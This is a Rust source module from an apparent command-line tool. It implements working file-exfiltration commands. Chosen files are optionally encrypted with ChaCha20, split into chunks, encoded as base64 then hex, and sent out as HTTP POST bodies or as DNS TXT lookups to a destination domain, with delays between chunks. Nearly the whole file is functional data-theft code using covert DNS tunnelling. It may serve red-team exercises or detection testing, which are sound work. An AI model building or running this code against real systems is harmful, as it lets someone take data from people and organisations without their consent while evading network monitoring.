/*!
Exfiltration subcommands for the runner CLI.

This module contains concrete command implementations for exfiltrating files
over different protocols. Two primary approaches are provided:

- HTTP: post encoded chunks to an HTTP endpoint.
- DNS: send encoded chunks as DNS queries (TXT-style labels), taking care to
  split payloads into DNS-label-safe chunks.

Each command type implements `CommandHandler` and performs its work when
`handle()` is invoked by the top-level CLI dispatch.
*/
use clap::{Args, Subcommand, ValueEnum};
use hickory_resolver::name_server::TokioConnectionProvider;
use std::path::PathBuf;

use crate::CommandHandler;

#[derive(Debug, Clone)]
pub enum CipherKeyType {
    /// Direct string key
    /// Example: str=my_secret_key
    String(String),

    /// File path to read the key from
    /// Example: file=/path/to/keyfile.txt
    File(PathBuf),

    /// URL to fetch the key from
    /// Example: url=https://example.com/keyfile.txt
    Url(reqwest::Url),
}

impl CipherKeyType {
    /// Retrieve the cipher key as a byte stream, regardless of its original source.
    ///
    /// # Returns
    /// A `Result` containing the cipher key bytes or an error message.
    ///
    /// # Errors
    /// - If the key type is `File` and reading the file fails.
    /// - If the key type is `Url` and fetching the URL fails.
    pub fn get_key_string(&self) -> crate::error::Result<Vec<u8>> {
        match self {
            CipherKeyType::String(key_str) => Ok(key_str.bytes().collect()),
            CipherKeyType::File(path_buf) => Ok(crate::encoders::buffered_read_file(path_buf)?),
            CipherKeyType::Url(url) => {
                let response = match reqwest::blocking::get(url.clone()) {
                    Ok(resp) => resp,
                    Err(req_err) => {
                        return Err(crate::error::RunnerError::request_error(format!(
                            "Failed to fetch cipher key from URL: {}",
                            req_err
                        )))
                    }
                };
                Ok(response.text()?.bytes().collect())
            }
        }
    }
}

impl std::str::FromStr for CipherKeyType {
    type Err = String;

    fn from_str(raw_arg: &str) -> Result<Self, Self::Err> {
        if !raw_arg.contains('=') {
            return Err("Cipher key type must be in the format str=<key_string>, file=<key_file_path>, or url=<key_url>".to_string());
        }

        let mut split_raw_arg = raw_arg.split('=');
        let key_type = match split_raw_arg.next() {
            Some(kt) => kt.to_lowercase(),
            None => {
                return Err("Invalid cipher key type format. Use str=<key_string>, file=<key_file_path>, or url=<key_url>".to_string());
            }
        };
        let key_value = match split_raw_arg.next() {
            Some(kv) => kv,
            None => {
                return Err("Invalid cipher key type format. Use str=<key_string>, file=<key_file_path>, or url=<key_url>".to_string());
            }
        };

        match key_type.as_str() {
            "str" => Ok(CipherKeyType::String(key_value.to_string())),
            "file" => Ok(
                CipherKeyType::File(
                    PathBuf::from(
                        match shellexpand::full(key_value) {
                            Ok(expanded) => expanded.to_string(),
                            Err(e) => return Err(format!("Failed to expand file path: {}", e)),
                        }
                    )
                )
            ),
            "url" => match reqwest::Url::parse(key_value) {
                Ok(url) => Ok(CipherKeyType::Url(url)),
                Err(e) => Err(format!("Invalid URL format: {}", e)),
            },
            _ => Err("Invalid cipher key type format. Use str=<key_string>, file=<key_file_path>, or url=<key_url>".to_string()),
        }
    }
}

#[derive(Debug, Args)]
pub struct ExfiltrationArgs {
    /// Optional cipher key specifier.
    ///
    /// Format: str=key_string | file=key_file_path | url=key_url
    ///
    /// Examples:
    ///
    /// --cipher-key str=my_secret_key
    ///
    /// --cipher-key file=/path/to/keyfile.txt
    ///
    /// --cipher-key url=https://example.com/keyfile.txt
    ///
    /// If provided, the exfiltration commands will use the specified key
    /// to encrypt the payload using ChaCha20 before exfiltration.
    #[arg(
        long = "cipher-key",
        required = false,
        global = true,
        value_name = "str=key_string|file=key_file_path|url=key_url"
    )]
    cipher_key: Option<CipherKeyType>,
}

/// Wrapper struct for the `exfil` subcommand family.
///
/// This struct delegates to a chosen `ExfiltrationType` subcommand (HTTP or DNS)
/// parsed via `clap`. It implements `CommandHandler` to perform the dispatch.
#[derive(Debug, Args)]
pub struct ExfiltrationSubCommandArgs {
    /// Exfiltration transport type to use.
    #[command(subcommand)]
    exfil_type: ExfiltrationType,

    /// Common exfiltration arguments.
    #[command(flatten)]
    args: ExfiltrationArgs,
}

impl CommandHandler for ExfiltrationSubCommandArgs {
    /// Execute the selected exfiltration variant.
    fn handle(self) -> crate::error::Result<()> {
        match self.exfil_type {
            ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle(self.args)?,
            ExfiltrationType::DNS(exfil_dns_subcmd) => exfil_dns_subcmd.handle(self.args)?,
        };

        Ok(())
    }
}

/// Supported exfiltration transport types.
///
/// Each enum variant wraps the concrete argument struct for that transport.
#[derive(Debug, Subcommand)]
pub enum ExfiltrationType {
    HTTP(HTTPExfiltrationSubCommand),
    DNS(DNSExfiltrationSubCommand),
}

impl Into<crate::nodes::root::EncryptionType> for &CipherKeyType {
    fn into(self) -> crate::nodes::root::EncryptionType {
        match self {
            CipherKeyType::String(_) => crate::nodes::root::EncryptionType::String,
            CipherKeyType::File(_) => crate::nodes::root::EncryptionType::File,
            CipherKeyType::Url(_) => crate::nodes::root::EncryptionType::Url,
        }
    }
}

/// Trait defining common behavior for exfiltration commands.
/// Provides a method for encrypting payloads and a required `handle` method
/// for executing the exfiltration logic.
///
/// # Methods
/// - `encrypt_payload`: Encrypts the given payload bytes using ChaCha20
///   with a nonce derived from the root node.
/// - `handle`: Abstract method to be implemented by concrete exfiltration commands.
trait ExfiltrateCommandHandler {
    fn encrypt_payload(
        &self,
        cipher_key: Vec<u8>,
        payload_bytes: Vec<u8>,
        root_node: &crate::nodes::root::RootNode,
    ) -> crate::error::Result<Vec<u8>> {
        let root_node_str = root_node.to_string();
        let nonce = root_node_str.as_bytes().last_chunk::<12>().unwrap();
        crate::ciphers::chacha20_encrypt(cipher_key, nonce, payload_bytes)
    }

    fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()>;
}

/// HTTP-based exfiltration subcommand arguments.
///
/// The command reads each file, splits it into `chunks` parts, encodes each
/// part using the project's canonical base64->hex encoding and sends each
/// encoded chunk as the text/plain body of an HTTP POST request to the specified url.
#[derive(Debug, Clone, Args)]
#[command(name = "http")]
pub struct HTTPExfiltrationSubCommand {
    /// Files to exfiltrate
    #[arg(long = "src-files", required = true, value_delimiter = ',', num_args = 1..)]
    files_path: Vec<PathBuf>,

    /// Destination of the exfiltrated files
    #[arg(short = 'u', long = "url", required = true)]
    url: String,

    /// Delay between each chunk sent (in milliseconds)
    #[arg(
        long = "delay",
        required = false,
        default_value_t = 500,
        value_parser=clap::value_parser!(u32).range(50..)
    )]
    delay: u32,

    /// Number of chunks to split the file into
    #[arg(
        long = "chunks",
        required = false,
        default_value_t = 10,
        value_parser=clap::value_parser!(u16).range(1..)
    )]
    chunks: u16,
}

impl ExfiltrateCommandHandler for HTTPExfiltrationSubCommand {
    /// Execute the HTTP exfiltration flow.
    ///
    /// Notes:
    /// - Each file specified in `files_path` is read, optionally encrypted
    ///   with the provided cipher key, chunked into `chunks` parts,
    ///   encoded using base64->hex encoding, and sent as the body
    ///   of an HTTP POST request to the specified `url`.
    ///
    /// - A delay of `delay` milliseconds is observed between sending each chunk.
    ///
    /// - The `reqwest` crate is used for HTTP requests.
    ///
    /// - If a `cipher_key` is provided, the payload is encrypted using
    ///   ChaCha20-Poly1305 before chunking and encoding.
    ///
    /// - Logging is performed at various stages to provide feedback on progress.
    ///
    /// # Errors
    /// - Returns an error if file reading, encryption, chunking,
    ///   encoding, or HTTP requests fail.
    fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()> {
        for file_path in self.files_path.iter() {
            log::debug!("Reading file {}", file_path.to_string_lossy());

            let mut root_node = crate::nodes::root::RootNode::try_from(file_path)?;
            log::info!("Exfiltrating file '{}'", root_node.file_name);

            let mut file_bytes = crate::encoders::buffered_read_file(file_path)?;

            if let Some(cipher_key) = args.cipher_key.as_ref() {
                log::info!("Encrypting payload with provided cipher key.");
                file_bytes =
                    self.encrypt_payload(cipher_key.get_key_string()?, file_bytes, &root_node)?;
                root_node.set_encryption_type(cipher_key.into());
            }

            let chunk_nodes = crate::encoders::http::build_chunk_nodes(
                std::rc::Rc::clone(&root_node.file_identifier),
                file_bytes,
                self.chunks as usize,
            )?;

            let nodes = {
                let mut temp_nodes = vec![crate::nodes::Node::Root(root_node)];
                temp_nodes.extend(chunk_nodes);
                temp_nodes
            };

            log::info!(
                "Sending {} chunks to {} with {}ms delay between requests.",
                nodes.len() - 1,
                self.url,
                self.delay
            );
            for payload_chunk in crate::encoders::http::encode_file_chunks_to_hex_b64(nodes) {
                log::debug!("Sending chunk: {}", payload_chunk);

                reqwest::blocking::Client::new()
                    .post(&self.url)
                    .body(payload_chunk)
                    .header("Content-Type", "text/plain")
                    .send()?;
                std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
            }
        }

        Ok(())
    }
}

/// DNS transport protocol choices for DNS exfiltration.
///
/// The enum is exposed as a CLI `ValueEnum` to allow specifying `--protocol` on
/// the command line. The inner conversion maps to the `hickory_resolver` crate's
/// protocol type used when building the resolver configuration.
#[derive(ValueEnum, Copy, Clone, Debug, PartialEq, Eq)]
enum DNSProtocol {
    Tcp,
    Udp,
}

impl From<DNSProtocol> for hickory_resolver::proto::xfer::Protocol {
    /// Convert the CLI `DNSProtocol` value into the resolver crate's protocol
    /// enumeration.
    fn from(value: DNSProtocol) -> Self {
        match value {
            DNSProtocol::Tcp => hickory_resolver::proto::xfer::Protocol::Tcp,
            DNSProtocol::Udp => hickory_resolver::proto::xfer::Protocol::Udp,
        }
    }
}

/// DNS-based exfiltration subcommand arguments.
#[derive(Debug, Clone, Args)]
#[command(name = "dns")]
pub struct DNSExfiltrationSubCommand {
    /// File to exfiltrate
    #[arg(short = 'f', long = "src-file", required = true)]
    file_path: PathBuf,

    /// Destination of the exfiltrated file
    #[arg(short = 'd', long = "dest", required = true)]
    destination: String,

    /// Delay between each chunk sent (in milliseconds)
    #[arg(long = "delay", required = false, default_value_t = 500)]
    delay: u32,

    /// DNS transport protocol to use (TCP or UDP)
    #[arg(short='p', long="protocol", required=false, default_value_t=DNSProtocol::Udp, value_enum)]
    proto: DNSProtocol,

    /// Optional DNS nameserver to use for lookups (default: 127.0.0.1:1053)
    #[arg(
        short = 'n',
        long = "nameserver",
        default_value = Some("127.0.0.1:1053"),
        required = false
    )]
    nameserver: Option<std::net::SocketAddr>,
}

impl DNSExfiltrationSubCommand {
    /// Build a DNS resolver instance based on the command configuration.
    /// If a `nameserver` is provided, it is used; otherwise, the system default
    /// resolver configuration is used.
    ///
    /// # Returns
    /// A `hickory_resolver::Resolver` instance configured for use in DNS lookups.
    ///
    /// # Notes
    ///
    /// - The resolver uses the `hickory_resolver` crate and is built with
    ///   `TokioConnectionProvider` for async DNS queries.
    /// - If a custom `nameserver` is specified, it is added to the resolver
    ///   configuration with the selected protocol (TCP/UDP).
    /// - If no `nameserver` is provided, the default system resolver
    ///   configuration is used.
    fn build_dns_resolver(&self) -> hickory_resolver::Resolver<TokioConnectionProvider> {
        let resolver_config = match self.nameserver {
            Some(name_server) => {
                log::info!("Setting DNS resolver {:?}", self.nameserver);

                let mut resolver_config = hickory_resolver::config::ResolverConfig::new();
                resolver_config.add_name_server(hickory_resolver::config::NameServerConfig::new(
                    name_server,
                    self.proto.into(),
                ));
                resolver_config
            }
            None => hickory_resolver::config::ResolverConfig::default(),
        };
        hickory_resolver::Resolver::builder_with_config(
            resolver_config,
            TokioConnectionProvider::default(),
        )
        .build()
    }
}

impl ExfiltrateCommandHandler for DNSExfiltrationSubCommand {
    /// Execute the DNS exfiltration flow.
    ///
    /// # Arguments
    /// - `args`: ExfiltrationArgs containing optional cipher key for encryption.
    ///
    /// Notes:
    /// - The resolver uses the `hickory_resolver` crate and will build an
    ///   async resolver instance. If a `nameserver` is provided, it will be
    ///   used; otherwise, the system default resolver configuration is used.
    ///
    /// - Each encoded chunk is emitted as a TXT lookup for `<chunk>.<destination>.`
    ///   to the configured resolver; this allows an authoritative server for
    ///   `destination` to receive the payload via the query name.
    fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()> {
        let resolver = self.build_dns_resolver();
        let tokio_runtime = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");

        log::debug!("Reading file {}", self.file_path.to_string_lossy());

        let mut root_node = crate::nodes::root::RootNode::try_from(&self.file_path)?;
        log::info!("Exfiltrating file '{}'", root_node.file_name);

        let mut file_bytes = crate::encoders::buffered_read_file(&self.file_path)?;

        if let Some(cipher_key) = args.cipher_key.as_ref() {
            log::info!("Encrypting payload with provided cipher key.");

            file_bytes =
                self.encrypt_payload(cipher_key.get_key_string()?, file_bytes, &root_node)?;
            root_node.set_encryption_type(cipher_key.into());
        }

        let chunk_nodes = crate::encoders::dns::build_chunk_nodes(
            std::rc::Rc::clone(&root_node.file_identifier),
            self.destination.len(),
            file_bytes,
        )?;

        let encoded_nodes = {
            let mut temp_nodes = vec![crate::nodes::Node::Root(root_node)];
            temp_nodes.extend(chunk_nodes);
            crate::encoders::dns::encode_payload(temp_nodes)?
        };

        log::info!(
            "Sending {} chunks to {} with {}ms delay between requests.",
            encoded_nodes.len(),
            self.destination,
            self.delay
        );
        for encoded_node in encoded_nodes {
            let dns_query = format!("{}.{}.", encoded_node, self.destination);
            log::debug!("Sending node: {}", dns_query);

            tokio_runtime.block_on(resolver.txt_lookup(dns_query))?;

            std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
        }

        Ok(())
    }
}
